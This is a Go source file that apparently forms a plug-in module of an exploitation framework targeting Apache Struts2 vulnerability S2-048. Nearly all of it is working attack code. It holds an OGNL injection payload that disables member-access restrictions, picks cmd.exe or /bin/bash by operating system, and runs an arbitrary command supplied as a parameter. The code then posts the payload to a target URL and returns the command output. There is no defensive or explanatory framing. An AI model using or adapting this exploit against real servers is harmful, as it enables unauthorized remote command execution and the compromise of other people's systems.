package exp_Struts2

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_S2_048 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_S2_048) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	shellPayload := `name=${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='lz520520').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new java.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&age=a&__checkbox_bustedBefore=true&description=s`
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(self.Params.BaseParam.Target, shellPayload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_S2_048{}, "exp_S2_048.yml")
}
